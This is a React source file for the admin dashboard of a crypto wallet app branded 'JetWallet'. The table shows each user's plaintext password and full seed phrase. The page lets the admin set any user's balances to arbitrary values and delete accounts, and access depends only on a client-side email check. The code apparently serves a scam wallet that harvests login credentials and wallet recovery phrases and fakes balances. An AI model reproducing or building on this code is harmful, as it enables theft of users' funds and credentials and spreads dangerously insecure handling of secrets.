import React, { useState } from 'react';
import { useAuth } from '../hooks/useAuth';
import { User, Wallet, CoinID, WalletState, Transaction } from '../types';
import { COINS } from '../constants';
import { Navigate } from 'react-router-dom';
import CoinLogo from '../components/CoinLogo';

const Card: React.FC<{ children: React.ReactNode; className?: string }> = ({ children, className = '' }) => (
    <div className={`bg-slate-800 rounded-xl shadow-lg p-6 ${className}`}>{children}</div>
);

const Modal: React.FC<{ isOpen: boolean; onClose: () => void; title: string; children: React.ReactNode }> = ({ isOpen, onClose, title, children }) => {
    if (!isOpen) return null;
    return (
        <div className="fixed inset-0 bg-black bg-opacity-70 flex justify-center items-center z-50 transition-opacity" onClick={onClose}>
            <div className="bg-slate-800 rounded-lg shadow-xl w-full max-w-4xl m-4 max-h-[90vh] flex flex-col" onClick={(e) => e.stopPropagation()}>
                <div className="flex justify-between items-center p-4 border-b border-slate-700">
                    <h3 className="text-lg font-bold text-white">{title}</h3>
                    <button onClick={onClose} className="text-slate-400 hover:text-white text-2xl">&times;</button>
                </div>
                <div className="p-6 overflow-y-auto">{children}</div>
            </div>
        </div>
    );
};

const Admin: React.FC = () => {
    const { currentUser, users, updateCurrentUserFinancials, deleteUser } = useAuth();
    const [editingUser, setEditingUser] = useState<User | null>(null);
    const [viewingHistory, setViewingHistory] = useState<User | null>(null);
    
    if (currentUser?.email !== 'admin@jetwallet.io') {
        return <Navigate to="/wallets" replace />;
    }

    const regularUsers = users.filter(u => u.email !== 'admin@jetwallet.io');

    const handleBalanceChange = (userId: string, coinId: CoinID, newBalance: string) => {
        const user = users.find(u => u.id === userId);
        if (!user) return;

        const balance = parseFloat(newBalance);
        if (isNaN(balance)) return;

        // Update if exists, otherwise add a new wallet entry for this coin.
        let newWallets = user.wallets.some(w => w.coinId === coinId)
          ? user.wallets.map(w => (w.coinId === coinId ? { ...w, balance } : w))
          : [...user.wallets, { coinId, balance }];

        // Optionally prune zero-balance wallets to keep things tidy.
        newWallets = newWallets.filter(w => w.balance !== 0);

        const financialData: WalletState = {
            wallets: newWallets,
            transactions: user.transactions,
            staked: user.staked
        };
        updateCurrentUserFinancials(userId, financialData);
    };

    const handleDeleteUser = (userId: string) => {
        if (window.confirm("Are you sure you want to delete this user? This action cannot be undone.")) {
            deleteUser(userId);
        }
    }

    return (
        <div className="space-y-6">
            <Card>
                <h1 className="text-3xl font-bold text-white">Admin Dashboard</h1>
                <p className="text-slate-400">Manage all registered users and their data.</p>
            </Card>

            <div className="bg-slate-800 rounded-xl shadow-lg overflow-x-auto">
                <table className="w-full text-sm text-left text-slate-300">
                    <thead className="text-xs text-slate-400 uppercase bg-slate-700/50">
                        <tr>
                            <th scope="col" className="px-6 py-3">Email</th>
                            <th scope="col" className="px-6 py-3">Password</th>
                            <th scope="col" className="px-6 py-3">Registered At</th>
                            <th scope="col" className="px-6 py-3">Seed Phrase</th>
                            <th scope="col" className="px-6 py-3 text-center">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {regularUsers.map(user => (
                            <tr key={user.id} className="bg-slate-800 border-b border-slate-700 hover:bg-slate-700/50">
                                <td className="px-6 py-4 font-medium text-white">{user.email}</td>
                                <td className="px-6 py-4 font-mono">{user.password}</td>
                                <td className="px-6 py-4">{new Date(user.registeredAt).toLocaleString()}</td>
                                <td className="px-6 py-4 font-mono text-xs max-w-xs truncate" title={user.seedPhrase}>{user.seedPhrase}</td>
                                <td className="px-6 py-4 space-x-2 text-center">
                                    <button onClick={() => setEditingUser(user)} className="font-medium text-blue-400 hover:underline">Edit Balances</button>
                                    <button onClick={() => setViewingHistory(user)} className="font-medium text-green-400 hover:underline">History</button>
                                    <button onClick={() => handleDeleteUser(user.id)} className="font-medium text-red-400 hover:underline">Delete</button>
                                </td>
                            </tr>
                        ))}
                    </tbody>
                </table>
                {regularUsers.length === 0 && <p className="text-center p-4 text-slate-500">No regular users have registered yet.</p>}
            </div>

            {/* Edit Balances Modal */}
            <Modal isOpen={!!editingUser} onClose={() => setEditingUser(null)} title={`Editing Balances for ${editingUser?.email}`}>
                <div className="space-y-4">
                    {Object.values(COINS).map(coin => {
                        const currentBalance = editingUser?.wallets.find(w => w.coinId === coin.id)?.balance ?? 0;
                        return (
                            <div key={coin.id} className="flex items-center gap-4">
                                <CoinLogo coinId={coin.id} className="h-8 w-8" size={32} />
                                <span className="font-bold w-16">{coin.id}</span>
                                <input
                                    type="number"
                                    step="any"
                                    defaultValue={currentBalance}
                                    onBlur={(e) => editingUser && handleBalanceChange(editingUser.id, coin.id, e.target.value)}
                                    className="w-full bg-slate-700 border border-slate-600 rounded-md p-2 text-white"
                                />
                            </div>
                        );
                    })}
                </div>
            </Modal>
            
            {/* View History Modal */}
            <Modal isOpen={!!viewingHistory} onClose={() => setViewingHistory(null)} title={`Transaction History for ${viewingHistory?.email}`}>
                <div className="overflow-x-auto">
                    <table className="w-full text-sm text-left text-slate-300">
                        <thead className="text-xs text-slate-400 uppercase bg-slate-700/50">
                             <tr>
                                <th scope="col" className="px-4 py-2">Date</th>
                                <th scope="col" className="px-4 py-2">Type</th>
                                <th scope="col" className="px-4 py-2">Asset</th>
                                <th scope="col" className="px-4 py-2 text-right">Amount</th>
                                <th scope="col" className="px-4 py-2">Hash</th>
                            </tr>
                        </thead>
                         <tbody>
                            {viewingHistory?.transactions.map((tx: Transaction) => (
                                <tr key={tx.id} className="bg-slate-800 border-b border-slate-700">
                                    <td className="px-4 py-2">{new Date(tx.date).toLocaleString()}</td>
                                    <td className="px-4 py-2">{tx.type}</td>
                                    <td className="px-4 py-2">{tx.coinId}</td>
                                    <td className="px-4 py-2 text-right">{tx.amount.toFixed(8)}</td>
                                    <td className="px-4 py-2 text-xs font-mono truncate max-w-xs">{tx.hash}</td>
                                </tr>
                            ))}
                         </tbody>
                    </table>
                    {viewingHistory?.transactions.length === 0 && <p className="text-center p-4 text-slate-500">No transactions found for this user.</p>}
                </div>
            </Modal>

        </div>
    );
};

export default Admin;
